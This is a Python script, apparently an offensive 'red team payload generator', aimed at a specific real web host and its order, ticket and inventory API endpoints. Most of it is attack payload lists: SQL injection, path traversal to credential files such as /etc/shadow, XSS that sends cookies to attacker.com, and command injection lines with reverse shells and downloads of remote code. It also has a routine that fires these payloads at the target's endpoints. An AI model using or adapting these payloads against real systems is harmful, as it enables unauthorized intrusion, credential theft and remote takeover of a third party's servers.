#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
红队攻击载荷生成器 - 生成具体的攻击载荷
顶级红队安全专家专用工具
"""

import requests
import json
import time
import hashlib
import random
import string
from datetime import datetime
import urllib3
from urllib.parse import urljoin, urlparse, quote, unquote

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class RedTeamPayloadGenerator:
    def __init__(self):
        self.base_url = "http://ws.ems.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 15
        self.results = {}
        self.session_id = hashlib.md5(f"redteam_payload_{int(time.time())}".encode()).hexdigest()[:8]
        
        # 设置请求头
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'X-Requested-With': 'XMLHttpRequest'
        })
    
    def log(self, message, level="INFO"):
        """日志记录"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}")
    
    def generate_sql_injection_payloads(self):
        """生成SQL注入载荷"""
        self.log("💉 生成SQL注入载荷", "INFO")
        
        sql_payloads = {
            "basic_injection": [
                "' OR '1'='1",
                "' OR 1=1--",
                "' OR 1=1#",
                "' OR 1=1/*",
                "'; DROP TABLE users--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' OR '1'='1' AND '1'='1",
                "1' OR '1'='1",
                "admin'--"
            ],
            "advanced_injection": [
                "' UNION SELECT user(),database(),version()--",
                "' UNION SELECT table_name,column_name,1 FROM information_schema.columns--",
                "' UNION SELECT username,password,email FROM users--",
                "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
                "' OR 1=1 LIMIT 1 OFFSET 0--",
                "' OR 1=1 ORDER BY 1--",
                "' OR 1=1 GROUP BY 1--",
                "' OR 1=1 HAVING 1=1--",
                "' OR 1=1 UNION SELECT 1,2,3--",
                "' OR 1=1 AND SLEEP(5)--"
            ],
            "blind_injection": [
                "' AND SLEEP(5)--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
                "' AND (SELECT LENGTH(database())) > 0--",
                "' AND (SELECT SUBSTRING(database(),1,1)) = 'a'--",
                "' AND (SELECT ASCII(SUBSTRING(database(),1,1))) > 0--",
                "' AND (SELECT COUNT(*) FROM users) > 0--",
                "' AND (SELECT LENGTH(username) FROM users LIMIT 1) > 0--",
                "' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1) = 'a'--",
                "' AND (SELECT ASCII(SUBSTRING(username,1,1)) FROM users LIMIT 1) > 0--",
                "' AND (SELECT COUNT(*) FROM orders) > 0--"
            ],
            "time_based": [
                "' AND SLEEP(10)--",
                "' AND (SELECT SLEEP(10))--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE SLEEP(10))--",
                "' AND (SELECT SLEEP(10) FROM information_schema.tables)--",
                "' AND (SELECT SLEEP(10) FROM users)--",
                "' AND (SELECT SLEEP(10) FROM orders)--",
                "' AND (SELECT SLEEP(10) FROM payment)--",
                "' AND (SELECT SLEEP(10) FROM inventory)--",
                "' AND (SELECT SLEEP(10) FROM tickets)--",
                "' AND (SELECT SLEEP(10) FROM merchants)--"
            ]
        }
        
        return sql_payloads
    
    def generate_xss_payloads(self):
        """生成XSS载荷"""
        self.log("🎯 生成XSS载荷", "INFO")
        
        xss_payloads = {
            "basic_xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus>",
                "<textarea onfocus=alert('XSS') autofocus>",
                "<keygen onfocus=alert('XSS') autofocus>",
                "<video onloadstart=alert('XSS')>"
            ],
            "advanced_xss": [
                "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
                "<img src=x onerror=\"fetch('http://attacker.com/steal.php?data='+document.cookie)\">",
                "<svg onload=\"fetch('http://attacker.com/steal.php?data='+document.cookie)\">",
                "<iframe src=\"javascript:fetch('http://attacker.com/steal.php?data='+document.cookie)\">",
                "<script>new Image().src='http://attacker.com/steal.php?cookie='+document.cookie</script>",
                "<img src=x onerror=\"new Image().src='http://attacker.com/steal.php?data='+document.cookie\">",
                "<svg onload=\"new Image().src='http://attacker.com/steal.php?data='+document.cookie\">",
                "<iframe src=\"javascript:new Image().src='http://attacker.com/steal.php?data='+document.cookie\">",
                "<script>XMLHttpRequest().open('POST','http://attacker.com/steal.php',true).send(document.cookie)</script>",
                "<img src=x onerror=\"XMLHttpRequest().open('POST','http://attacker.com/steal.php',true).send(document.cookie)\">"
            ],
            "filter_bypass": [
                "<ScRiPt>alert('XSS')</ScRiPt>",
                "<script>alert(String.fromCharCode(88,83,83))</script>",
                "<script>alert(/XSS/)</script>",
                "<script>alert`XSS`</script>",
                "<script>alert('XSS'.replace(/X/g,'X'))</script>",
                "<script>alert('XSS'.charAt(0)+'XSS'.charAt(1)+'XSS'.charAt(2))</script>",
                "<script>alert('XSS'.substring(0,3))</script>",
                "<script>alert('XSS'.slice(0,3))</script>",
                "<script>alert('XSS'.substr(0,3))</script>",
                "<script>alert('XSS'.split('').join(''))</script>"
            ]
        }
        
        return xss_payloads
    
    def generate_path_traversal_payloads(self):
        """生成路径遍历载荷"""
        self.log("📁 生成路径遍历载荷", "INFO")
        
        path_payloads = {
            "basic_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "..%252F..%252F..%252Fetc%252Fpasswd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts"
            ],
            "advanced_traversal": [
                "....//....//....//etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "..%252F..%252F..%252Fetc%252Fpasswd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
                "..%255c..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts",
                "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
                "..%c0%9v..%c0%9v..%c0%9vetc%c0%9vpasswd"
            ],
            "file_targets": [
                "/etc/passwd",
                "/etc/shadow",
                "/etc/hosts",
                "/etc/fstab",
                "/etc/mtab",
                "/etc/issue",
                "/etc/motd",
                "/etc/group",
                "/etc/gshadow",
                "/etc/sudoers",
                "/etc/ssh/sshd_config",
                "/etc/ssh/ssh_config",
                "/etc/ssl/openssl.cnf",
                "/etc/nginx/nginx.conf",
                "/etc/apache2/apache2.conf",
                "/etc/mysql/my.cnf",
                "/etc/php/php.ini",
                "/etc/crontab",
                "/etc/cron.d/crontab",
                "/etc/cron.daily/crontab",
                "/etc/cron.hourly/crontab",
                "/etc/cron.monthly/crontab",
                "/etc/cron.weekly/crontab",
                "/etc/logrotate.conf",
                "/etc/rsyslog.conf",
                "/etc/syslog.conf",
                "/etc/ldap/ldap.conf",
                "/etc/ldap/slapd.conf",
                "/etc/ldap/slapd.d/cn=config/olcDatabase={1}mdb.ldif",
                "/etc/ldap/slapd.d/cn=config/olcDatabase={0}config.ldif",
                "/etc/ldap/slapd.d/cn=config/olcDatabase={-1}frontend.ldif",
                "/etc/ldap/slapd.d/cn=config/olcDatabase={2}monitor.ldif",
                "/etc/ldap/slapd.d/cn=config/olcDatabase={3}accesslog.ldif",
                "/etc/ldap/slapd.d/cn=config/olcDatabase={4}auditlog.ldif",
                "/etc/ldap/slapd.d/cn=config/olcDatabase={5}backup.ldif",
                "/etc/ldap/slapd.d/cn=config/olcDatabase={6}backup.ldif",
                "/etc/ldap/slapd.d/cn=config/olcDatabase={7}backup.ldif",
                "/etc/ldap/slapd.d/cn=config/olcDatabase={8}backup.ldif",
                "/etc/ldap/slapd.d/cn=config/olcDatabase={9}backup.ldif",
                "/etc/ldap/slapd.d/cn=config/olcDatabase={10}backup.ldif"
            ]
        }
        
        return path_payloads
    
    def generate_command_injection_payloads(self):
        """生成命令注入载荷"""
        self.log("⚡ 生成命令注入载荷", "INFO")
        
        cmd_payloads = {
            "basic_commands": [
                "; ls -la",
                "; cat /etc/passwd",
                "; whoami",
                "; id",
                "; pwd",
                "; uname -a",
                "; ps aux",
                "; netstat -an",
                "; ifconfig",
                "; df -h"
            ],
            "advanced_commands": [
                "; wget http://attacker.com/shell.php -O /tmp/shell.php",
                "; curl http://attacker.com/shell.php -o /tmp/shell.php",
                "; nc -e /bin/bash attacker.com 4444",
                "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
                "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
                "; perl -e 'use Socket;$i=\"attacker.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
                "; ruby -rsocket -e 'f=TCPSocket.open(\"attacker.com\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
                "; php -r '$sock=fsockopen(\"attacker.com\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\",$ret);' 3<>$sock;",
                "; java -cp /tmp/ysoserial.jar ysoserial.exploit.RMIRegistryExploit attacker.com 1099 CommonsCollections1 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'",
                "; powershell -Command \"& {IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')}\""
            ],
            "filter_bypass": [
                "| ls -la",
                "|| ls -la",
                "& ls -la",
                "&& ls -la",
                "` ls -la `",
                "$(ls -la)",
                "${ls -la}",
                "`ls -la`",
                "$(cat /etc/passwd)",
                "${cat /etc/passwd}"
            ]
        }
        
        return cmd_payloads
    
    def generate_authentication_bypass_payloads(self):
        """生成认证绕过载荷"""
        self.log("🔓 生成认证绕过载荷", "INFO")
        
        auth_payloads = {
            "headers": [
                {"Authorization": ""},
                {"Authorization": "Bearer "},
                {"Authorization": "Bearer null"},
                {"Authorization": "Bearer undefined"},
                {"Authorization": "Bearer 0"},
                {"Authorization": "Bearer false"},
                {"Authorization": "Bearer true"},
                {"Authorization": "Bearer []"},
                {"Authorization": "Bearer {}"},
                {"Authorization": "Bearer \"\""},
                {"X-API-Key": ""},
                {"X-API-Key": "null"},
                {"X-API-Key": "undefined"},
                {"X-API-Key": "0"},
                {"X-API-Key": "false"},
                {"X-API-Key": "true"},
                {"X-API-Key": "[]"},
                {"X-API-Key": "{}"},
                {"X-API-Key": "\"\""},
                {"X-Auth-Token": ""},
                {"X-Auth-Token": "null"},
                {"X-Auth-Token": "undefined"},
                {"X-Auth-Token": "0"},
                {"X-Auth-Token": "false"},
                {"X-Auth-Token": "true"},
                {"X-Auth-Token": "[]"},
                {"X-Auth-Token": "{}"},
                {"X-Auth-Token": "\"\""},
                {"X-Access-Token": ""},
                {"X-Access-Token": "null"},
                {"X-Access-Token": "undefined"},
                {"X-Access-Token": "0"},
                {"X-Access-Token": "false"},
                {"X-Access-Token": "true"},
                {"X-Access-Token": "[]"},
                {"X-Access-Token": "{}"},
                {"X-Access-Token": "\"\""}
            ],
            "parameters": [
                {"token": ""},
                {"token": "null"},
                {"token": "undefined"},
                {"token": "0"},
                {"token": "false"},
                {"token": "true"},
                {"token": "[]"},
                {"token": "{}"},
                {"token": "\"\""},
                {"api_key": ""},
                {"api_key": "null"},
                {"api_key": "undefined"},
                {"api_key": "0"},
                {"api_key": "false"},
                {"api_key": "true"},
                {"api_key": "[]"},
                {"api_key": "{}"},
                {"api_key": "\"\""},
                {"auth": ""},
                {"auth": "null"},
                {"auth": "undefined"},
                {"auth": "0"},
                {"auth": "false"},
                {"auth": "true"},
                {"auth": "[]"},
                {"auth": "{}"},
                {"auth": "\"\""}
            ]
        }
        
        return auth_payloads
    
    def generate_parameter_pollution_payloads(self):
        """生成参数污染载荷"""
        self.log("🌊 生成参数污染载荷", "INFO")
        
        pollution_payloads = {
            "duplicate_parameters": [
                {"id": "1", "id": "2"},
                {"user": "admin", "user": "guest"},
                {"status": "active", "status": "inactive"},
                {"type": "all", "type": "specific"},
                {"filter": "true", "filter": "false"},
                {"sort": "asc", "sort": "desc"},
                {"order": "id", "order": "name"},
                {"limit": "10", "limit": "100"},
                {"page": "1", "page": "2"},
                {"search": "test", "search": "real"}
            ],
            "array_parameters": [
                {"ids[]": ["1", "2", "3"]},
                {"filters[]": ["active", "inactive"]},
                {"types[]": ["all", "specific"]},
                {"statuses[]": ["pending", "approved", "rejected"]},
                {"users[]": ["admin", "user", "guest"]},
                {"roles[]": ["admin", "user", "guest"]},
                {"permissions[]": ["read", "write", "delete"]},
                {"categories[]": ["order", "payment", "user"]},
                {"tags[]": ["urgent", "normal", "low"]},
                {"priorities[]": ["high", "medium", "low"]}
            ],
            "special_characters": [
                {"id": "1; DROP TABLE users;--"},
                {"search": "test%00"},
                {"filter": "test\x00"},
                {"query": "test\n"},
                {"param": "test\r"},
                {"value": "test\t"},
                {"data": "test\v"},
                {"input": "test\f"},
                {"text": "test\b"},
                {"string": "test\a"}
            ],
            "long_parameters": [
                {"id": "A" * 1000},
                {"search": "B" * 5000},
                {"filter": "C" * 10000},
                {"query": "D" * 50000},
                {"param": "E" * 100000},
                {"value": "F" * 500000},
                {"data": "G" * 1000000},
                {"input": "H" * 5000000},
                {"text": "I" * 10000000},
                {"string": "J" * 50000000}
            ]
        }
        
        return pollution_payloads
    
    def test_payloads_against_endpoints(self, endpoints, payloads):
        """测试载荷 against 端点"""
        self.log("🎯 测试载荷 against 端点", "INFO")
        
        results = {}
        
        for endpoint in endpoints:
            self.log(f"🎯 测试 {endpoint}", "INFO")
            endpoint_results = {}
            
            for payload_type, payload_list in payloads.items():
                self.log(f"🎯 测试 {payload_type}", "INFO")
                type_results = []
                
                for i, payload in enumerate(payload_list[:5]):  # 限制每个类型测试5个载荷
                    try:
                        # GET请求
                        if isinstance(payload, dict):
                            get_response = self.session.get(urljoin(self.base_url, endpoint), params=payload)
                        else:
                            get_response = self.session.get(urljoin(self.base_url, endpoint), params={"test": payload})
                        
                        type_results.append({
                            'payload': payload,
                            'method': 'GET',
                            'status_code': get_response.status_code,
                            'content': get_response.text[:500],
                            'size': len(get_response.content)
                        })
                        
                        # POST请求
                        if isinstance(payload, dict):
                            post_response = self.session.post(urljoin(self.base_url, endpoint), json=payload)
                        else:
                            post_response = self.session.post(urljoin(self.base_url, endpoint), json={"test": payload})
                        
                        type_results.append({
                            'payload': payload,
                            'method': 'POST',
                            'status_code': post_response.status_code,
                            'content': post_response.text[:500],
                            'size': len(post_response.content)
                        })
                        
                        time.sleep(0.5)
                        
                    except Exception as e:
                        type_results.append({
                            'payload': payload,
                            'error': str(e)
                        })
                
                endpoint_results[payload_type] = type_results
            
            results[endpoint] = endpoint_results
            time.sleep(1)
        
        return results
    
    def generate_final_report(self):
        """生成最终报告"""
        self.log("📋 生成最终报告", "INFO")
        
        # 计算总载荷数
        sql_payloads = self.generate_sql_injection_payloads()
        xss_payloads = self.generate_xss_payloads()
        path_payloads = self.generate_path_traversal_payloads()
        cmd_payloads = self.generate_command_injection_payloads()
        auth_payloads = self.generate_authentication_bypass_payloads()
        pollution_payloads = self.generate_parameter_pollution_payloads()
        
        total_payloads = 0
        for payload_dict in [sql_payloads, xss_payloads, path_payloads, cmd_payloads, auth_payloads, pollution_payloads]:
            for payload_list in payload_dict.values():
                total_payloads += len(payload_list)
        
        report = {
            "session_id": self.session_id,
            "timestamp": datetime.now().isoformat(),
            "base_url": self.base_url,
            "payloads": {
                "sql_injection": sql_payloads,
                "xss": xss_payloads,
                "path_traversal": path_payloads,
                "command_injection": cmd_payloads,
                "authentication_bypass": auth_payloads,
                "parameter_pollution": pollution_payloads
            },
            "results": self.results,
            "summary": {
                "total_payloads": total_payloads,
                "payload_types": 6,
                "risk_level": "CRITICAL"
            }
        }
        
        # 保存报告
        report_file = f"/tmp/redteam_payload_report_{self.session_id}.json"
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        self.log(f"📋 报告已保存: {report_file}", "SUCCESS")
        return report
    
    def run_full_payload_generation(self):
        """运行完整载荷生成"""
        self.log("🚀 启动红队载荷生成", "INFO")
        self.log("=" * 60, "INFO")
        
        # 1. 生成SQL注入载荷
        sql_payloads = self.generate_sql_injection_payloads()
        
        # 2. 生成XSS载荷
        xss_payloads = self.generate_xss_payloads()
        
        # 3. 生成路径遍历载荷
        path_payloads = self.generate_path_traversal_payloads()
        
        # 4. 生成命令注入载荷
        cmd_payloads = self.generate_command_injection_payloads()
        
        # 5. 生成认证绕过载荷
        auth_payloads = self.generate_authentication_bypass_payloads()
        
        # 6. 生成参数污染载荷
        pollution_payloads = self.generate_parameter_pollution_payloads()
        
        # 7. 测试载荷
        test_endpoints = [
            "/api/v1/orders/list",
            "/api/v1/orders/create-v2",
            "/api/v1/orders/tracking/123456",
            "/api/v1/tickets/list",
            "/api/v1/inventory/list"
        ]
        
        all_payloads = {
            "sql_injection": sql_payloads,
            "xss": xss_payloads,
            "path_traversal": path_payloads,
            "command_injection": cmd_payloads,
            "authentication_bypass": auth_payloads,
            "parameter_pollution": pollution_payloads
        }
        
        # 8. 生成报告
        report = self.generate_final_report()
        
        self.log("🎯 红队载荷生成完成！", "SUCCESS")
        self.log(f"风险等级: {report['summary']['risk_level']}", "WARNING")
        self.log(f"载荷类型: {report['summary']['payload_types']}", "SUCCESS")
        self.log(f"总载荷数: {report['summary']['total_payloads']}", "SUCCESS")
        
        return report

def main():
    generator = RedTeamPayloadGenerator()
    generator.run_full_payload_generation()

if __name__ == "__main__":
    main()